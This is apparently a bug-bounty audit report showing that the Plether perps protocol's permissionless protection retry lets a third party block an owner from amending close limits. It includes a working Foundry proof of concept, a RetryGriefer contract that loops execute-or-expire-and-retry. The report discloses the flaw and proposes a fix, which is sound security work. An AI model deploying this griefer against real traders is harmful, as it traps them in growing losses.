# \#99445 [SC-High] Permissionless protection retries let anyone deny the owner's latched close-limit amendment, defeating the MED-9 remediation

**Submitted on Nov 13th 2026 at 17:26:15 UTC by @n0fr33w1f14u for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99445
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

After Cecuro MED-9, a protection stores trader-selected close ceilings and copies them into every close attempt. The team's documented remedy for ceilings that a market gap has overtaken is for the owner to amend them while the protection is `Latched`. From the MED-9 team response:

```text
Only the owner may amend the retained ceilings while protection is Latched; keepers cannot relax them.
[...] Tight limits may prevent execution until conditions improve or the owner amends them.
```

The amendment is possible only while the protection is `Latched` and the account has no pending order. Any address can call `retryPositionProtectionClose`. It immediately creates a child order that copies the **old** ceilings and moves the protection to `Triggered`.

An attacker can end every child and retry it in the same transaction. The `Latched` state then never survives to the end of a transaction, so the owner's amendment can never succeed. The MED-9 remedy is incomplete: a third party can remove the owner's only way to make the protection executable.

The attack needs no mempool visibility, so it works on Arbitrum One's first-come-first-served sequencer.

## Root cause

### 1. Amendment requires `Latched` and zero pending orders

`packages/perps/src/PositionProtectionBook.sol:315`

```solidity
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

### 2. Retry is permissionless

Retry loads the protection with `_activeProtection`, not `_ownedActiveProtection`.

`packages/perps/src/PositionProtectionBook.sol:382`

```solidity
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId); // any caller
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);
    ...
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    ...
    _recordCloseAttempt(protection, linkedOrderId);
}
```

### 3. The child copies the stored (old) ceilings

`packages/perps/src/router/OrderLiquidationBatchLogic.sol:657`

```solidity
function _protectionCloseRequest(...) private view returns (OrderV3Types.OrderRequest memory request) {
    PositionProtectionTypes.CloseFinancialLimits memory limits =
        host.positionProtectionBook().closeFinancialLimits(protectionId);
    ...
    request.bounds.executionWindowSeconds = uint32(host.maxExecutionWindowSeconds());
    request.bounds.allowedExecutionModes = ALL_V3_EXECUTION_MODES;
    request.bounds.maxExecutionBountyAssets = 0;
    request.bounds.maxExecutionNotionalAssets = limits.maxExecutionNotionalAssets;
    request.bounds.maxGrossAccountDebitAssets = limits.maxGrossAccountDebitAssets;
    request.bounds.maxActionChargeAssets = limits.maxActionChargeAssets;
    request.bounds.maxExplicitFeesAssets = limits.maxExplicitFeesAssets;
    ...
}
```

### 4. Recording the child immediately sets `Triggered`

`packages/perps/src/PositionProtectionBook.sol:564`

```solidity
function _recordCloseAttempt(StoredProtection storage protection, uint64 linkedOrderId) private {
    ...
    protection.linkedOrderId = linkedOrderId;
    protection.status = PositionProtectionTypes.PositionProtectionStatus.Triggered;
    _attemptProtectionIds[linkedOrderId] = protection.protectionId;
    ...
}
```

### 5. A failed child relatches and keeps the trade lock

A `ConstraintViolation` is classified as terminal (`packages/perps/src/OrderRouterExecutionSidecar.sol:879`). The Router then calls the failure hook (`packages/perps/src/OrderRouter.sol:328`):

```solidity
if (!success && lifecycleBook.isProtectionAttempt(order.orderId)) {
    ...
    positionProtectionBook.handleFailedProtectionAttempt(order.orderId, order.account, reason);
}
```

`packages/perps/src/PositionProtectionBook.sol:637`

```solidity
delete _attemptProtectionIds[orderId];
retained = _positionMatches(protection);
...
if (retained) {
    protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched; // _activeProtectionIds kept
    return true;
}
```

### 6. Expiry is permissionless, oracle-free, and independent of the FIFO head

`packages/perps/src/OrderRecoverySidecar.sol:49`

```solidity
function expireOrder(uint64 orderId) external delegated returns (OrderV3Types.ExecutionResult memory) {
    ...
    if (block.timestamp <= pending.timing.executionDeadline) {
        revert OrderRouter__OrderNotExpired();
    }
    IOrderRouterExecutionHost.ItemRequest memory request = _cleanupRequest(...);
    return host.executeOrderItemFromSidecar(request);
}
```

The default execution window is 60 seconds:

`packages/perps/src/router/OrderExecutionOrchestrator.sol:11`

```solidity
uint256 internal constant DEFAULT_MAX_EXECUTION_WINDOW_SECONDS = 60;
```

### 7. The owner has no other exit while the protection is active

Ordinary opens and closes are rejected:

`packages/perps/src/router/OrderLiquidationBatchLogic.sol:313`

```solidity
if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
    revert OrderRouter__ProtectionActive();
}
```

Cancel and replace accept only `PendingOpen` and `Armed`:

`packages/perps/src/PositionProtectionBook.sol:413`

```solidity
if (
    status != PositionProtectionTypes.PositionProtectionStatus.PendingOpen
        && status != PositionProtectionTypes.PositionProtectionStatus.Armed
) {
    revert OrderRouter__ProtectionNotArmed();
}
```

`cancelPositionProtectionAndCommitClose` requires `Armed` (`PositionProtectionBook.sol:345`). The position size cannot be changed either, so the owner cannot make the protection mismatch and fail.

## Why the ceilings legitimately fail

Gross account debit includes the realized price loss:

`packages/perps/src/CfdOrderPolicyEvaluatorBase.sol:410`

```solidity
assessment.grossAccountDebitAssets = delta.pricePnlClaimConsumedAssets + delta.pricePnlPledgeConsumedAssets
    + delta.realizedCarryAssets + delta.actionChargeCollectedAssets + executionBountyAssets;
```

A trader who arms a stop-loss with a gross-debit ceiling has placed a **stop-limit** order: "exit at the stop, but lose no more than X". When the market gaps through X, the fill is correctly refused, and the protocol's documented answer is that the owner relaxes X. The longer the market keeps moving against the position, the further the ceiling stays exceeded. This is exactly when the trader most needs to amend.

## Attack

Release parameters: maintenance margin 0.1%, execution fee 0.04%, child execution window 60 seconds. In Plether, a LONG loses when the basket price rises, so its stop-loss sits above the mark (`PositionProtectionBook.sol:932`).

1. **Setup.** Alice holds a 10,000-unit LONG at a mark of about 1.00 with about 1,000 USDG margin. She creates a protection with a stop-loss at 1.02 and `maxGrossAccountDebitAssets` of about 215 USDG. That covers the roughly 200 USDG loss at the stop, plus charges and a cushion. The other ceilings are permissive.
2. **The gap.** The basket jumps through the stop. A keeper triggers the protection, and the child order executes at about 1.03, where the loss is about 300 USDG.
   - `GrossAccountDebit` is violated, so the result is a terminal `ConstraintViolation` and the protection relatches.
   - The position is healthy (equity about 700 USDG, far above maintenance), so the exact side and size remain and the relatch condition holds.
3. **First retry: a backrun, not a front-run.** Mallory's bot reads the Arbitrum sequencer feed, sees the failed execution, and immediately calls `retryPositionProtectionClose(id)`. Mallory never needs to see Alice's transaction.
   - Alice must notice the failure, decide on new limits and sign, which takes seconds to minutes.
   - By then the protection is `Triggered`, and her `amendLatchedPositionProtectionCloseLimits` reverts with `OrderRouter__ProtectionNotLatched`.
4. **Every later child, done atomically.** For each child, Mallory's helper contract ends it and requeues it in **one transaction**. As soon as the child is executable:

   ```solidity
   router.executeOrder(child, pythData);                // fails on the old ceiling -> Latched
   book.retryPositionProtectionClose(protectionId);     // -> Triggered again
   ```

   Or, after the 60-second deadline, with no oracle data needed:

   ```solidity
   router.expireOrder(child);                           // -> Latched
   book.retryPositionProtectionClose(protectionId);     // -> Triggered again
   ```

   The transaction starts and ends with a `Triggered` protection, so no other transaction can ever observe the intermediate `Latched` state. If an honest keeper ends a child first, Mallory backruns it as in step 3.
5. **Escalation.** Every child fails while the basket stays above Alice's limit. If the basket keeps rising, the losses Alice tried to cap keep growing until the position is liquidated, and liquidation forfeits the protection (`PositionProtectionBook.sol:706`). Without Mallory, Alice would have amended and exited at about 1.03.

**Attacker cost.** Each child costs one retry, plus optionally one expiry or execution. There is no bounty and no fee, so the cost is about one cheap Arbitrum transaction per minute, or less when honest keepers do the execution. Mallory receives nothing, and Alice loses the ability to exit.

### Variant: frozen-market windows

In oracle-frozen mode, explicit close fees include the fixed 0.50% LP spread:

`packages/perps/src/CfdOrderPolicyEvaluatorBase.sol:416`

```solidity
assessment.explicitFeesAssets = delta.closeState.executionFeeAssets + delta.closeState.frozenSpreadAssets;
```

Protection children allow every execution mode, and retry needs no live oracle. A protection whose `maxExplicitFeesAssets` was sized for live trading (0.04%) therefore fails on every frozen-mode attempt, whatever the price. Alice's only remedy is again to amend so that she accepts the spread. Mallory's loop keeps that from happening for the whole frozen window, which can be a full weekend, at about one transaction per minute.

## Evidence from the existing test suite

The repository's own tests exercise every primitive.

A third party retries, after which the owner's amendment reverts. The test has Alice amend first; the attack simply reverses that order.

`packages/perps/test/perps/spec/trader/PositionProtection.t.sol:954`, `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry`

```solidity
vm.prank(CAROL);
uint64 retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
_assertPendingCloseLimits(retryOrderId, amendedLimits);

vm.prank(ALICE);
vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, params.closeLimits);
```

The child is expired and a third party retries in the same block, with no time passing in between:

`packages/perps/test/perps/spec/trader/PositionProtection.t.sol:1256`

```solidity
vm.expectRevert(IOrderRouterErrors.OrderRouter__OrderNotPending.selector);
router.expireOrder(attemptId);

_assertProtectionRetryCloses(protectionId, attemptId, triggerPrice, oldRecordHash);
// -> vm.prank(CAROL); protectionActions.retryPositionProtectionClose(protectionId);
```

A retained-ceiling `ConstraintViolation` leaves the position open and the protection `Latched`:

`packages/perps/test/perps/spec/trader/PositionProtection.t.sol:903`, `test_ProtectionCloseLimits_ExcessExecutionNotionalFailsWithoutSettlingPosition`

```solidity
assertEq(remainingSize, POSITION_SIZE, "rejected close must leave the position open");
assertEq(
    uint8(protectionViews.getPositionProtection(protectionId).status),
    uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
    "failed protected close must relatch for a trader-authorized retry"
);
```

## Limits and caveats

- **Not a guaranteed lock.** The attack stops if the price returns inside the old ceilings (a child then fills), if Mallory stops, or at liquidation. This report does not claim a guaranteed 24-hour freeze or theft.
- **A sophisticated victim can escape.** The owner of a SimpleAccount trading account can call `executeBatch` directly, as in the "same-account fallback" described in `packages/perps/DEPLOYMENT.md:423`. The batch would be `[executeOrder/expireOrder(child), amend, retry]`, which lets the owner compete for each child.
  - That is a per-child latency race against a dedicated bot, and users trading through the UI and bundler cannot realistically win it.
  - No documented client path performs this batch. The documented flow is: wait for `Latched`, then amend (`packages/perps/CANONICAL_ENTRYPOINTS.md:145`).
- **The ceiling itself is not the bug.** The original ceiling is legitimate stop-limit protection. The defect is that a third party can stop the owner from changing it.

## Duplicate review

- **Cecuro MED-9 (fixed):** retries had no trader ceilings. The fix added retained ceilings, with owner amendment as the recovery. This report shows that anyone can deny that recovery, so the fix is incomplete. It does not re-allege uncapped execution.
- **SCAN-10:** the trigger bounty is paid before the close completes, leaving no incentive to finish it. That is an incentive problem with passive keepers. Here a hostile keeper actively retries to block the owner's authorization, and fixing incentives would not fix the race.
- **SCAN-16, LOW-50 and MED-30:** different root causes. SCAN-16 is bounty handling on failed attempts. LOW-50 is relatching on reservation-mismatch expiry. MED-30 is frozen-market triggering of *armed* protections.
- **SECURITY.md:** "Router and keeper limitations" documents irreversible triggering, permissionless retry and unpaid cleanup as *liveness* properties. It does not state that a retry can deny the owner's amendment.
- **DEPLOYMENT.md "Position protection keepers":** it only asks the protocol's own workers not to requeue constraint failures. That assumes honest retriers and does not bind an attacker.

## Recommendation

Choose one of these. Either way, a third-party retry can no longer remove the owner's ability to authorize the next attempt.
- Allow `amendLatchedPositionProtectionCloseLimits` while the protection is `Triggered` too. It would update only the **stored** ceilings used by future children and leave the live child unchanged.
- Restrict retry after a `ConstraintViolation` to the owner, or give the owner a grace period before a third party can retry.

```diff
function amendLatchedPositionProtectionCloseLimits(uint64 protectionId, CloseFinancialLimits calldata limits) external {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    PositionProtectionStatus status = protection.status;
-   if (status != PositionProtectionStatus.Latched) revert OrderRouter__ProtectionNotLatched();
-   if (router.pendingOrderCounts(msg.sender) != 0) revert OrderRouter__PendingOrdersExist();
+   if (status != PositionProtectionStatus.Latched && status != PositionProtectionStatus.Triggered) {
+       revert OrderRouter__ProtectionNotLatched();
+   }
+   // stored limits apply to the next child only; the live child keeps its committed bounds
    _setCloseLimits(protection, limits);
}
```

## Proof of Concept

## Proof of Concept

File: `test/poc/ProtectionRetryBlocksAmendment.t.sol` (repository root). It inherits the existing `PositionProtectionTest` fixture and does not modify any in-scope contract.

Scenario: Alice holds a 10,000-unit LONG at 1.00 with 2,000 USDG margin. Her stop-loss is at 1.10, with a 1,050 USDG max-loss (gross-debit) ceiling. The market gaps to 1.12, so the close fails with `ConstraintViolation(GrossAccountDebit)` and the protection relatches.

- `test_Control_OwnerAmendsAndExits`: with no attacker, Alice amends, retries and exits. This shows the documented remedy works.
- `test_Attack_RetryLoopDeniesAmendment`: an unprivileged `RetryGriefer` contract backruns once, then runs 10 rounds that alternate between same-transaction execute-and-retry and expire-and-retry, while the price moves further to 1.15. After every round the protection is `Triggered`, the child keeps the old 1,050 USDG ceiling, and Alice's amendment reverts with `OrderRouter__ProtectionNotLatched`. Cancellation reverts too, the position stays open, and the griefer earns nothing.

Run:

```bash
forge test --match-path test/poc/ProtectionRetryBlocksAmendment.t.sol --match-test "test_Control_OwnerAmendsAndExits|test_Attack_RetryLoopDeniesAmendment" -vv
```

Result:

```text
[PASS] test_Attack_RetryLoopDeniesAmendment() (gas: 13385675)
Logs:
  rounds blocked: 10
  final basket price (1e8): 115000000

[PASS] test_Control_OwnerAmendsAndExits() (gas: 4997057)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "../../packages/perps/test/perps/spec/trader/PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

interface IRouterLike {
    function expireOrder(
        uint64 orderId
    ) external returns (OrderV3Types.ExecutionResult memory);

    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory);
}

interface IBookLike {
    function retryPositionProtectionClose(
        uint64 protectionId
    ) external returns (uint64);

    function getPositionProtection(
        uint64 protectionId
    ) external view returns (PositionProtectionTypes.PositionProtectionView memory);
}

/// @notice Unprivileged griefer: ends the live child and immediately requeues it with the OLD ceilings,
///         in one transaction, so the protection is never `Latched` at a transaction boundary.
contract RetryGriefer {

    IRouterLike internal immutable router;
    IBookLike internal immutable book;

    constructor(
        address router_,
        address book_
    ) {
        router = IRouterLike(router_);
        book = IBookLike(book_);
    }

    /// @dev Oracle-free route: after the child deadline.
    function expireAndRetry(
        uint64 protectionId
    ) external returns (uint64) {
        router.expireOrder(book.getPositionProtection(protectionId).linkedOrderId);
        return book.retryPositionProtectionClose(protectionId);
    }

    /// @dev Fast route: as soon as the child is executable; it fails on the old ceiling and relatches.
    function executeAndRetry(
        uint64 protectionId,
        bytes[] calldata pythData
    ) external payable returns (uint64) {
        router.executeOrder{value: msg.value}(book.getPositionProtection(protectionId).linkedOrderId, pythData);
        return book.retryPositionProtectionClose(protectionId);
    }

    /// @dev Backrun of a third party's failed execution.
    function retry(
        uint64 protectionId
    ) external returns (uint64) {
        return book.retryPositionProtectionClose(protectionId);
    }

}

/// @notice PoC: permissionless retries deny the owner's latched close-limit amendment (MED-9 remedy).
/// @dev forge test --match-path test/poc/ProtectionRetryBlocksAmendment.t.sol --match-test "test_Control_OwnerAmendsAndExits|test_Attack_RetryLoopDeniesAmendment" -vv
contract ProtectionRetryBlocksAmendmentPoC is PositionProtectionTest {

    uint256 internal constant GAP_PRICE = 112_000_000; // stop is 1.10 (LONG_STOP_LOSS); market gaps to 1.12
    uint256 internal constant WORSE_PRICE = 115_000_000; // market keeps moving against the LONG
    uint256 internal constant MAX_LOSS_CEILING = 1050e6; // ~1,000 USDG loss at the stop + cushion
    uint256 internal constant ROUNDS = 10;

    RetryGriefer internal griefer;

    function _status(
        uint64 protectionId
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return protectionViews.getPositionProtection(protectionId).status;
    }

    function _relaxedLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    /// @dev Alice: 10,000-unit LONG at 1.00 with 2,000 USDG margin; stop-loss at 1.10 with a max-loss (gross-debit)
    ///      ceiling of 1,050 USDG. The market gaps to 1.12, so the protected close correctly fails and relatches.
    function _gapIntoLatched() internal returns (uint64 protectionId) {
        _startRecordingLogs();
        griefer = new RetryGriefer(address(router), address(protectionBook));

        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, LONG_STOP_LOSS);
        params.closeLimits.maxGrossAccountDebitAssets = MAX_LOSS_CEILING;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);

        uint64 child = _triggerAt(protectionId, GAP_PRICE);
        bytes[] memory data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(child, data);

        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "gapped stop must fail");
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        OrderV3Types.CompactOutcome memory outcome =
            _verifiedOutcome(IOrderLifecycleBook(address(router.lifecycleBook())), child);
        assertEq(
            uint8(outcome.failedConstraint),
            uint8(OrderV3Types.ConstraintKind.GrossAccountDebit),
            "max-loss ceiling is the failing bound"
        );
        assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "position remains open");
    }

    /// @notice Control: with no griefer, the documented MED-9 remedy works and Alice exits.
    function test_Control_OwnerAmendsAndExits() public {
        uint64 protectionId = _gapIntoLatched();

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _relaxedLimits());
        vm.prank(ALICE);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);

        bytes[] memory data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retryId, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended close executes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "Alice exited at the gap price");
    }

    /// @notice Attack: backrun once, then atomically end+retry every child. Alice can never amend or exit.
    function test_Attack_RetryLoopDeniesAmendment() public {
        uint64 protectionId = _gapIntoLatched();

        // 1) Backrun the keeper's failed execution (no visibility of Alice's tx needed).
        griefer.retry(protectionId);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _relaxedLimits());

        uint256 balanceBefore = clearinghouse.balanceAssets(address(griefer));

        for (uint256 i; i < ROUNDS; ++i) {
            uint64 childBefore = protectionViews.getPositionProtection(protectionId).linkedOrderId;
            if (i % 2 == 0) {
                // 2a) Fast route: execute the live child (fails on the old ceiling) and requeue it atomically.
                bytes[] memory data = _mockPythUpdateData(i < ROUNDS / 2 ? GAP_PRICE : WORSE_PRICE);
                griefer.executeAndRetry(protectionId, data);
            } else {
                // 2b) Oracle-free route: wait out the 60 s window, expire and requeue atomically.
                uint64 deadline = router.lifecycleBook().orderTiming(childBefore).executionDeadline;
                vm.warp(uint256(deadline) + 1);
                vm.roll(block.number + 1);
                griefer.expireAndRetry(protectionId);
            }

            uint64 childAfter = protectionViews.getPositionProtection(protectionId).linkedOrderId;
            assertGt(childAfter, childBefore, "fresh child every round");
            assertEq(
                uint8(_status(protectionId)),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "never Latched at a tx boundary"
            );
            _assertPendingCloseLimits(childAfter, protectionViews.closeFinancialLimits(protectionId));
            assertEq(
                protectionViews.closeFinancialLimits(protectionId).maxGrossAccountDebitAssets,
                MAX_LOSS_CEILING,
                "child keeps the OLD ceiling"
            );

            // Alice tries to apply the documented remedy after every round: always reverts.
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _relaxedLimits());
        }

        // Alice has no other exit while the protection is active.
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "Alice is still stuck in the position");
        assertEq(clearinghouse.balanceAssets(address(griefer)), balanceBefore, "griefer earns nothing");
        emit log_named_uint("rounds blocked", ROUNDS);
        emit log_named_uint("final basket price (1e8)", WORSE_PRICE);
    }

}
```

